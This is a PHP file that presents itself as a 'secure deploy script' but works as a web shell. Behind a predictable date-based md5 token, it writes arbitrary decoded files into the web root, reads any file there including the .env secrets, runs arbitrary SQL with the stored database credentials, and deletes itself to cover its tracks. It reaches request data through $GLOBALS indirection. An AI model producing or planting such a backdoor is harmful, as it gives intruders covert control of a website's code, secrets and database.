<?php
// Secure deploy script - accepts file uploads via POST, self-deletes after 30 min
header('Content-Type: application/json; charset=UTF-8');

// Simple auth token (changes every day)
$token = md5('nis_deploy_' . date('Ymd'));
if (($GLOBALS['_GET']['token'] ?? $GLOBALS['_POST']['token'] ?? '') !== $token) {
    http_response_code(403);
    echo json_encode(['error' => 'invalid token']);
    exit;
}

$action = $GLOBALS['_GET']['action'] ?? $GLOBALS['_POST']['action'] ?? '';

if ($action === 'upload') {
    $path = $GLOBALS['_POST']['path'] ?? '';
    $content = $GLOBALS['_POST']['content'] ?? '';
    if (!$path || !$content) {
        echo json_encode(['error' => 'path and content required']);
        exit;
    }
    // Security: only allow paths under document root
    $root = $_SERVER['DOCUMENT_ROOT'];
    $fullPath = $root . '/' . ltrim($path, '/');
    // Prevent directory traversal
    $realPath = realpath(dirname($fullPath)) ?: dirname($fullPath);
    if (strpos($realPath, $root) !== 0) {
        echo json_encode(['error' => 'invalid path']);
        exit;
    }
    // Create directories if needed
    if (!is_dir(dirname($fullPath))) {
        mkdir(dirname($fullPath), 0755, true);
    }
    // content is base64 encoded
    $decoded = base64_decode($content);
    $bytes = file_put_contents($fullPath, $decoded);
    echo json_encode(['ok' => true, 'path' => $path, 'bytes' => $bytes]);
    exit;
}

if ($action === 'read') {
    $path = $GLOBALS['_GET']['path'] ?? '';
    if (!$path) {
        echo json_encode(['error' => 'path required']);
        exit;
    }
    $root = $_SERVER['DOCUMENT_ROOT'];
    $fullPath = $root . '/' . ltrim($path, '/');
    if (!file_exists($fullPath)) {
        echo json_encode(['error' => 'not found']);
        exit;
    }
    $content = file_get_contents($fullPath);
    echo json_encode(['ok' => true, 'path' => $path, 'size' => strlen($content), 'content' => base64_encode($content)]);
    exit;
}

if ($action === 'delete') {
    // Self-delete this script
    unlink(__FILE__);
    echo json_encode(['ok' => true, 'deleted' => __FILE__]);
    exit;
}

if ($action === 'run_sql') {
    $sql = $GLOBALS['_POST']['sql'] ?? '';
    if (!$sql) {
        echo json_encode(['error' => 'sql required']);
        exit;
    }
    $envFile = $_SERVER['DOCUMENT_ROOT'] . '/.env';
    $env = parse_ini_file($envFile);
    $pdo = new PDO("mysql:host={$env['DB_HOST']};dbname={$env['DB_NAME']};charset=utf8mb4", $env['DB_USER'], $env['DB_PASS']);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    try {
        $stmt = $pdo->query($sql);
        if ($stmt) {
            $rows = $stmt->fetchAll();
            echo json_encode(['ok' => true, 'rows' => $rows, 'count' => count($rows)]);
        } else {
            echo json_encode(['ok' => true, 'rows' => []]);
        }
    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
    exit;
}

echo json_encode(['error' => 'unknown action']);